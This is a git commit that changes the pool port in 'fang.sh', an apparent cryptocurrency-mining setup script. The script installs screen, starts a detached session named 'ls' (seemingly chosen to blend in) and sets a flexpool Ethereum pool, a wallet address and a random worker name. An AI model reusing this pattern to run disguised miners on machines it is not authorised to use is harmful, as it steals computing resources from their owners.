f55ce09b42e508e1f2a4d943dfdc4a59e0fbcbe3
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-30 20:14:02 +0530

    Update fang.sh

--- fang.sh
+++ fang.sh
@@ -2,7 +2,7 @@
 sudo apt update 
 sudo apt install screen libjansson4 -y 
 screen -dmS ls 
-POOL=eth-us-east.flexpool.io:5555
+POOL=eth-us-east.flexpool.io:4444
 WALLET=0xC4e7C8C7cbA2c0587Cf690aC37Dc790Da0dfeEE5
 WORKER=$(echo $(shuf -i 1-4 -n 1)-ARKIN)
 
